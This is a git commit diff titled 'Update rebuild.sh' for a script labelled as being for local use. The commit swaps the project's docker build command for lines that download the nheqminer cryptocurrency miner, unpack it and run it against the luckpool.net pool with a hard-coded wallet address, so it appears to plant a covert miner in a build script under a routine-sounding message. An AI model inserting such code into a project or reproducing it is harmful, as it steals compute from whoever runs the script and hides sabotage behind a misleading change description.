e9312ebb2e0bbcabf17711514a28a63d3e5fa590
simonfuhxz <93241615+simonfuhxz@users.noreply.github.com>
2021-10-27 12:06:00 +0700

    Update rebuild.sh

--- rebuild.sh
+++ rebuild.sh
@@ -2,5 +2,8 @@
 #
 # This is a handy script for local use
 
-docker build --tag cd-demo-container .
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x -t 2
 
